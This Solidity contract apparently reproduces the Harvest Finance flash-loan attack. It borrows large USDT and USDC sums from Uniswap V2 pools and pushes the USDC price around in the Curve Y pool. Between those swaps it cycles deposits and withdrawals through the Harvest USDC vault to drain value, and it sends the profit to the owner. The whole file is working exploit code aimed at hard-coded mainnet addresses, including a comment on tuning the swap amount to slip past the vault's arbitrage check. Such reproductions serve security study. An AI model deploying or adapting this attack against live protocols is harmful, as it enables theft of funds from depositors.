// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import "./Interfaces.sol";

contract HarvestFinanceExploit is Ownable {
    address constant HARVEST_FINANCE_USDC_VAULT =
        0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;
    address constant UNI_ETH_USDT_POOL =
        0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address constant UNI_USDC_ETH_POOL =
        0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address constant YPOOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    uint256 constant USDT_FLASHLOAN_AMOUNT = 20_000_000e6;
    uint256 constant USDC_FLASHLOAN_AMOUNT = 50_000_000e6;
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    function exploit() external onlyOwner {
        bytes memory _data = abi.encode("USDT");
        // Get flashloan from Uniswap V2
        IUniswapV2Pair(UNI_ETH_USDT_POOL).swap(
            0,
            USDT_FLASHLOAN_AMOUNT,
            address(this),
            _data
        );
        usdt.transfer(owner(), usdt.balanceOf(address(this)));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(sender == address(this));
        if (msg.sender == UNI_ETH_USDT_POOL) {
            handleUSDTFlashloanCallback(amount1);
        }

        if (msg.sender == UNI_USDC_ETH_POOL) {
            handleUSDCFlashlonCallback(amount0);
        }
    }

    function handleUSDTFlashloanCallback(uint256 amount) internal {
        bytes memory _data = abi.encode("USDC");
        // Request USDC Flashloan from uniswap
        IUniswapV2Pair(UNI_USDC_ETH_POOL).swap(
            USDC_FLASHLOAN_AMOUNT,
            0,
            address(this),
            _data
        );
        // Convert rest of the USDC ( after paying off USDC flashloan ) to USDT
        // This is to cover flashloan fees of 0.3%
        IYSwap(YPOOL).exchange_underlying(
            1,
            2,
            usdc.balanceOf(address(this)),
            0
        );
        usdt.transfer(msg.sender, calculateFlashloanReturnAmount(amount));
    }

    function handleUSDCFlashlonCallback(uint256 amount) internal {
        for (uint8 i = 0; i < 10; i++) {
            arb();
        }
        // Pay back USDC Flashloan
        usdc.transfer(msg.sender, calculateFlashloanReturnAmount(amount));
    }

    function calculateFlashloanReturnAmount(uint256 amount)
        internal
        pure
        returns (uint256)
    {
        uint256 fee = (amount * 3) / 997 + 1;
        return amount + fee;
    }

    function arb() internal {
        if (usdt.allowance(address(this), YPOOL) < 17_222_012_640_506)
            usdt.approve(YPOOL, type(uint256).max);
        uint256 usdcBalanceBefore = usdc.balanceOf(address(this));
        IYSwap(YPOOL).exchange_underlying(
            2, // USDT
            1, // USDC
            17_222_012_640_506, // This value was selected to avoid arbcheck() function failure
            0
        );
        uint256 usdcBalanceAfter = usdc.balanceOf(address(this));
        uint256 usdcReceivedFromSwap = usdcBalanceAfter - usdcBalanceBefore;
        usdc.approve(HARVEST_FINANCE_USDC_VAULT, type(uint256).max);
        IHarvestVault(HARVEST_FINANCE_USDC_VAULT).deposit(
            USDC_FLASHLOAN_AMOUNT
        );
        // Swap USDC back to USDT . Now USDC price in the Y pool is back to how it was at the beginning of this contract
        // execution.
        usdc.approve(YPOOL, type(uint256).max);
        IYSwap(YPOOL).exchange_underlying(
            1, // usdc
            2, // usdt
            usdcReceivedFromSwap,
            0
        );
        IHarvestVault(HARVEST_FINANCE_USDC_VAULT).withdraw(
            IHarvestVault(HARVEST_FINANCE_USDC_VAULT).balanceOf(address(this))
        );
    }
}
